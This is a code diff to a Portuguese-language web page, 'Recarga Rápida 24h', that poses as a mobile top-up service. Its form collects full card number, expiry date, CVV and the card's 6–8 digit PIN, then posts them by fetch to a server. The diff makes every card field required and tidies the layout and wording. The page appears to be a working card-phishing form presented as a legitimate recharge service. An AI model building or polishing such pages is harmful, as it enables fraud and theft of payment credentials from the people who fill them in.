@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Recarga Rápida</title>
+    <title>Recarga Rápida 24h</title>
     <style>
         body { background-color: #0d1117; color: #f0f6fc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: #161b22; padding: 25px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 350px; }
         h2 { text-align: center; color: #58a6ff; margin-bottom: 20px; font-size: 1.2rem; }
         label { display: block; margin: 10px 0 5px; font-size: 14px; color: #8b949e; }
         input, select { width: 100%; padding: 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
-        .row { display: flex; gap: 10px; }
         .hidden { display: none; }
         button { width: 100%; padding: 15px; background: #238636; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; }
         button.next { background: #58a6ff; }
@@ -37,27 +36,28 @@
 
             <div id="etapa2" class="hidden">
                 <label>Número do Cartão</label>
-                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16">
-                <div class="row">
-                    <div style="width: 60%;">
-                        <label>Validade (MM/AA)</label>
-                        <input type="text" id="data" placeholder="12/28" maxlength="5">
+                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" maxlength="16" required>
+                <div style="display: flex; gap: 10px;">
+                    <div style="flex: 1;">
+                        <label>Validade</label>
+                        <input type="text" id="data" placeholder="MM/AA" maxlength="5" required>
                     </div>
-                    <div style="width: 40%;">
+                    <div style="flex: 1;">
                         <label>CVV</label>
-                        <input type="text" id="cvv" placeholder="123" maxlength="3">
+                        <input type="text" id="cvv" placeholder="000" maxlength="3" required>
                     </div>
                 </div>
-                <label>Valor</label>
-                <select id="valor">
+                <label>Valor da Recarga</label>
+                <select id="valor" required>
                     <option value="20">R$ 20,00</option>
                     <option value="40">R$ 40,00</option>
                     <option value="100">R$ 100,00</option>
                 </select>
                 <label>Senha do Cartão (6 ou 8 dígitos)</label>
-                <input type="password" id="senha" placeholder="Sua senha" minlength="6" maxlength="8">
+                <input type="password" id="senha" placeholder="******" minlength="6" maxlength="8" required>
                 <button type="submit">FINALIZAR E RECEBER EM 24H</button>
             </div>
+            <p class="info-24h">Sua recarga será processada em até 24 horas.</p>
         </form>
     </div>
 
@@ -86,7 +86,7 @@
                 body: JSON.stringify(dados)
             });
             if (response.ok) {
-                alert('Pedido recebido! Sua recarga será feita em até 24h.');
+                alert('Pedido recebido! Recarga em até 24h.');
                 window.location.reload();
             }
         };
